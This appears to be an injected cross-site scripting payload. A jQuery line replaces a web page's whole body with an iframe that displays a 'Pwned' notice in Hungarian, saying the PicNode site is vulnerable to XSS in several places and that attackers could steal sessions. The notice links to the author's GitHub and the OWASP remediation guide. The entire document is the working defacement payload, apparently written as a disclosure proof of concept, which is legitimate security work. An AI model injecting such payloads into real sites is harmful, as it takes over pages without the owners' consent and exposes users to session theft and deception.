$(document.body).html('<iframe style="height:100%; width:100%; margin:0; border:0; display:block" src="data:text/html,%3Chtml%3E%0A%09%3Chead%3E%0A%09%09%3Cmeta%20charset%3D%22utf-8%22%3E%0A%09%09%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%09%09%3Cmeta%20name%3D%22author%22%20content%3D%22Raffy27%22%3E%0A%09%09%3Ctitle%3EPwned%3C%2Ftitle%3E%0A%09%09%3Cstyle%3E%0A%09%09%09%2A%2C%0A%09%09%09%2A%3A%3Aafter%2C%0A%09%09%09%2A%3A%3Abefore%20%7B%0A%09%09%09%20%20margin%3A%200%3B%0A%09%09%09%20%20padding%3A%200%3B%0A%09%09%09%20%20box-sizing%3A%20border-box%3B%0A%09%09%09%7D%0A%0A%09%09%09html%20%7B%0A%09%09%09%20%20font-size%3A%2062.5%25%3B%0A%09%09%09%7D%0A%0A%09%09%09body%20%7B%0A%09%09%09%20%20--light%3A%20hsl%280%2C%200%25%2C%20100%25%29%3B%0A%09%09%09%20%20--background%3A%20linear-gradient%28to%20right%20bottom%2C%20hsl%28236%2C%2050%25%2C%2050%25%29%2C%20hsl%28195%2C%2050%25%2C%2050%25%29%29%3B%0A%0A%09%09%09%20%20display%3A%20flex%3B%0A%09%09%09%20%20flex-direction%3A%20column%3B%0A%09%09%09%20%20justify-content%3A%20center%3B%0A%09%09%09%20%20align-items%3A%20center%3B%0A%0A%09%09%09%20%20font-family%3A%20-apple-system%2C%20BlinkMacSystemFont%2C%20%27Segoe%20UI%27%2C%20%27Open%20Sans%27%2C%20sans-serif%3B%0A%0A%09%09%09%20%20min-height%3A%20100vh%3B%0A%09%09%09%20%20background%3A%20%23263238%3B%0A%09%09%09%7D%0A%0A%09%09%09a%2C%0A%09%09%09a%3Alink%20%7B%0A%09%09%09%20%20font-family%3A%20inherit%3B%0A%09%09%09%20%20text-decoration%3A%20none%3B%0A%09%09%09%20%20color%3A%20white%3B%0A%09%09%09%7D%0A%0A%09%09%09.modal-container%20%7B%0A%09%09%09%20%20position%3A%20fixed%3B%0A%09%09%09%20%20top%3A%200%3B%0A%09%09%09%20%20left%3A%200%3B%0A%09%09%09%20%20z-index%3A%2010%3B%0A%0A%09%09%09%20%20display%3A%20none%3B%0A%09%09%09%20%20justify-content%3A%20center%3B%0A%09%09%09%20%20align-items%3A%20center%3B%0A%0A%09%09%09%20%20width%3A%20100%25%3B%0A%09%09%09%20%20height%3A%20100%25%3B%0A%0A%09%09%09%20%20background%3A%20hsla%280%2C%200%25%2C%2040%25%2C%20.6%29%3B%0A%09%09%09%7D%0A%0A%09%09%09%2F%2A%20using%20%3Atarget%20%2A%2F%0A%09%09%09.modal-container%3Atarget%20%7B%0A%09%09%09%20%20display%3A%20flex%3B%0A%09%09%09%7D%0A%0A%09%09%09.modal%20%7B%0A%09%09%09%20%20width%3A%2060rem%3B%0A%09%09%09%20%20padding%3A%204rem%202rem%3B%0A%09%09%09%20%20border-radius%3A%20.8rem%3B%0A%0A%09%09%09%20%20color%3A%20var%28--light%29%3B%0A%09%09%09%20%20background%3A%20var%28--background%29%3B%0A%09%09%09%20%20box-shadow%3A%20.4rem%20.4rem%202.4rem%20.2rem%20hsla%28236%2C%2050%25%2C%2050%25%2C%200.3%29%3B%0A%09%09%09%20%20position%3A%20relative%3B%0A%0A%09%09%09%20%20overflow%3A%20hidden%3B%0A%09%09%09%7D%0A%0A%09%09%09.modal__details%20%7B%0A%09%09%09%20%20text-align%3A%20center%3B%0A%0A%09%09%09%20%20margin-bottom%3A%204rem%3B%0A%09%09%09%20%20padding-bottom%3A%204rem%3B%0A%09%09%09%20%20border-bottom%3A%201px%20solid%20hsla%280%2C%200%25%2C%20100%25%2C%20.4%29%3B%0A%09%09%09%7D%0A%0A%09%09%09.modal__title%20%7B%0A%09%09%09%20%20font-size%3A%203.2rem%3B%0A%09%09%09%7D%0A%0A%09%09%09.modal__description%20%7B%0A%09%09%09%20%20margin-top%3A%202rem%3B%0A%0A%09%09%09%20%20font-size%3A%201.6rem%3B%0A%09%09%09%20%20font-style%3A%20italic%3B%0A%09%09%09%7D%0A%0A%09%09%09.modal__text%20%7B%0A%09%09%09%20%20padding%3A%200%204rem%3B%0A%09%09%09%20%20margin-bottom%3A%204rem%3B%0A%0A%09%09%09%20%20font-size%3A%201.6rem%3B%0A%09%09%09%20%20line-height%3A%202%3B%0A%09%09%09%7D%0A%0A%09%09%09.modal__text%3A%3Abefore%20%7B%0A%09%09%09%20%20content%3A%20%27%27%3B%0A%0A%09%09%09%20%20position%3A%20absolute%3B%0A%09%09%09%20%20top%3A%200%25%3B%0A%09%09%09%20%20left%3A%20100%25%3B%0A%09%09%09%20%20transform%3A%20translate%28-50%25%2C%20-50%25%29%3B%0A%0A%09%09%09%20%20width%3A%2018rem%3B%0A%09%09%09%20%20height%3A%2018rem%3B%0A%09%09%09%20%20border%3A%201px%20solid%20hsla%280%2C%200%25%2C%20100%25%2C%20.2%29%3B%0A%09%09%09%20%20border-radius%3A%20100rem%3B%0A%0A%09%09%09%20%20pointer-events%3A%20none%3B%0A%09%09%09%7D%0A%0A%09%09%09.modal__btn%20%7B%0A%09%09%09%20%20padding%3A%201rem%201.6rem%3B%0A%09%09%09%20%20border%3A%201px%20solid%20hsla%280%2C%200%25%2C%20100%25%2C%20.4%29%3B%0A%09%09%09%20%20border-radius%3A%20100rem%3B%0A%0A%09%09%09%20%20color%3A%20inherit%3B%0A%09%09%09%20%20background%3A%20transparent%3B%0A%09%09%09%20%20font-size%3A%201.4rem%3B%0A%09%09%09%20%20font-family%3A%20inherit%3B%0A%09%09%09%20%20letter-spacing%3A%20.2rem%3B%0A%0A%09%09%09%20%20transition%3A%20.2s%3B%0A%09%09%09%20%20cursor%3A%20pointer%3B%0A%09%09%09%7D%0A%0A%09%09%09.modal__btn%3Ahover%2C%0A%09%09%09.modal__btn%3Afocus%20%7B%0A%09%09%09%20%20border-color%3A%20hsla%280%2C%200%25%2C%20100%25%2C%20.6%29%3B%0A%09%09%09%20%20transform%3A%20translateY%28-.2rem%29%3B%0A%09%09%09%7D%0A%0A%09%09%09.link-1%20%7B%0A%09%09%09%20%20font-size%3A%201.8rem%3B%0A%0A%09%09%09%20%20color%3A%20var%28--light%29%3B%0A%09%09%09%20%20background%3A%20var%28--background%29%3B%0A%09%09%09%20%20box-shadow%3A%20.4rem%20.4rem%202.4rem%20.2rem%20hsla%28236%2C%2050%25%2C%2050%25%2C%200.3%29%3B%0A%09%09%09%20%20border-radius%3A%20100rem%3B%0A%09%09%09%20%20padding%3A%201.4rem%203.2rem%3B%0A%0A%09%09%09%20%20transition%3A%20.2s%3B%0A%09%09%09%7D%0A%0A%09%09%09.link-1%3Ahover%2C%0A%09%09%09.link-1%3Afocus%20%7B%0A%09%09%09%20%20transform%3A%20translateY%28-.2rem%29%3B%0A%09%09%09%20%20box-shadow%3A%200%200%204.4rem%20.2rem%20hsla%28236%2C%2050%25%2C%2050%25%2C%200.4%29%3B%0A%09%09%09%7D%0A%0A%09%09%09.link-2%20%7B%0A%09%09%09%20%20width%3A%204rem%3B%0A%09%09%09%20%20height%3A%204rem%3B%0A%09%09%09%20%20border%3A%201px%20solid%20hsla%280%2C%200%25%2C%20100%25%2C%20.4%29%3B%0A%09%09%09%20%20border-radius%3A%20100rem%3B%0A%0A%09%09%09%20%20color%3A%20inherit%3B%0A%09%09%09%20%20font-size%3A%202.2rem%3B%0A%0A%09%09%09%20%20position%3A%20absolute%3B%0A%09%09%09%20%20top%3A%202rem%3B%0A%09%09%09%20%20right%3A%202rem%3B%0A%0A%09%09%09%20%20display%3A%20flex%3B%0A%09%09%09%20%20justify-content%3A%20center%3B%0A%09%09%09%20%20align-items%3A%20center%3B%0A%0A%09%09%09%20%20transition%3A%20.2s%3B%0A%09%09%09%7D%0A%0A%09%09%09.link-2%3A%3Abefore%20%7B%0A%09%09%09%20%20content%3A%20%27%C3%97%27%3B%0A%0A%09%09%09%20%20transform%3A%20translateY%28-.1rem%29%3B%0A%09%09%09%7D%0A%0A%09%09%09.link-2%3Ahover%2C%0A%09%09%09.link-2%3Afocus%20%7B%0A%09%09%09%20%20border-color%3A%20hsla%280%2C%200%25%2C%20100%25%2C%20.6%29%3B%0A%09%09%09%20%20transform%3A%20translateY%28-.2rem%29%3B%0A%09%09%09%7D%0A%09%09%3C%2Fstyle%3E%0A%09%3C%2Fhead%3E%0A%09%3Cbody%3E%0A%09%09%3Ca%20href%3D%22%23modal-opened%22%20class%3D%22link-1%22%20id%3D%22modal-closed%22%3EMi%20t%C3%B6rt%C3%A9nt%3F%3C%2Fa%3E%0A%0A%09%09%3Cdiv%20class%3D%22modal-container%22%20id%3D%22modal-opened%22%3E%0A%09%09%09%3Cdiv%20class%3D%22modal%22%3E%0A%0A%09%09%09%09%3Cdiv%20class%3D%22modal__details%22%3E%0A%09%09%09%09%09%3Ch1%20class%3D%22modal__title%22%3EXSS%3C%2Fh1%3E%0A%09%09%09%09%09%3Cp%20class%3D%22modal__description%22%3EA%20PicNode%20jelenlegi%20verzi%C3%B3ja%20sajnos%20t%C3%B6bb%20helyen%20is%20sebezhet%C5%91.%3Cbr%3E10%2F11%2F2020%3C%2Fp%3E%0A%09%09%09%09%3C%2Fdiv%3E%0A%0A%09%09%09%09%3Cp%20class%3D%22modal__text%22%3EAmit%20itt%20l%C3%A1tsz%2C%20az%20egy%20egyszer%C5%B1%20Cross-Site%20Scripting%20sebezhet%C5%91s%C3%A9g%20eredm%C3%A9nye.%20B%C3%A1rki%20m%C3%B3dos%C3%ADthatja%20az%20oldal%20tartalm%C3%A1t%2C%20munkameneteket%20lophat%2C%20%C3%A9s%20%C3%A1tverheti%20a%20felhaszn%C3%A1l%C3%B3kat.%3C%2Fp%3E%0A%0A%09%09%09%09%3Ccenter%3E%3Ca%20href%3D%22https%3A%2F%2Fgithub.com%2FRaffy27%22%20style%3D%22margin-right%3A20px%3B%22%3E%3Cbutton%20class%3D%22modal__btn%22%3ER%C3%B3lam%3C%2Fbutton%3E%3C%2Fa%3E%3Ca%20href%3D%22https%3A%2F%2Fcheatsheetseries.owasp.org%2Fcheatsheets%2FCross_Site_Scripting_Prevention_Cheat_Sheet.html%22%3E%3Cbutton%20class%3D%22modal__btn%22%3EOWASP%20Remediation%20Guide%3C%2Fbutton%3E%3C%2Fa%3E%3C%2Fcenter%3E%0A%0A%09%09%09%09%3Ca%20href%3D%22%23modal-closed%22%20class%3D%22link-2%22%3E%3C%2Fa%3E%0A%0A%09%09%09%3C%2Fdiv%3E%0A%09%09%3C%2Fdiv%3E%0A%09%3C%2Fbody%3E%0A%3C%2Fhtml%3E"></iframe>');
console.log('Szervusz :D');